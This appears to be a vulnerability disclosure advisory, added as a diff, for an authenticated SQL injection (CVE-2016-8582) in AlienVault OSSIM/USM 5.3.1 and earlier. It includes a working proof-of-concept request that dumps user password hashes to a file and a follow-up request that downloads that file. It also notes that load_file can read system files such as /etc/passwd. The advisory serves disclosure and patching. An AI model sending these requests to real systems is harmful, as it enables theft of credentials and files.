@@ -1,0 +1,53 @@
+Details
+=======
+
+Product: Alienvault OSSIM/USM
+Vulnerability: SQL Injection
+Author: Peter Lapp, lappsec () gmail com
+CVE: CVE-2016-8582
+Vulnerable Versions: <=5.3.1
+Fixed Version: 5.3.2
+
+
+
+Vulnerability Details
+=====================
+
+A SQL injection vulnerability exists in the value parameter of
+/ossim/dashboard/sections/widgets/data/gauge.php on line 231. By
+sending a serialized array with a SQL query in the type field, it's
+possible to execute an arbitrary SQL query. The result is not
+displayed on the screen, but it can be exploited as a blind SQLi or
+have the output directed to a file and then retrieved via another
+request. Authentication is required.
+
+
+
+POC
+===
+
+This request will dump user password hashes to a file:
+
+/ossim/dashboard/sections/widgets/data/gauge.php?&type=alarm&wtype=blah&asset=1&height=1&value=a%3A1%3A%7Bs%3A4%3A%22type%22%3Bs%3A67%3A%22pass+from+users+INTO+OUTFILE+%27%2Ftmp%2F10.0.0.123_pass_tshark.pcap%27--+-%22%3B%7D
+
+The file containing the output can then be retrieved with the following request:
+/ossim/pcap/download.php?scan_name=pass&sensor_ip=10.0.0.123
+
+It's also possible to read the contents of any file readable by the
+mysql user by using mysql's load_file function. For example, changing
+the request to something like select load_file('/etc/passwd') .
+
+
+
+Timeline
+========
+
+08/03/16 - Reported to Vendor
+10/03/16 - Fixed in version 5.3.2
+
+
+
+References
+==========
+
+https://www.alienvault.com/forums/discussion/7766/security-advisory-alienvault-5-3-2-address-70-vulnerabilities
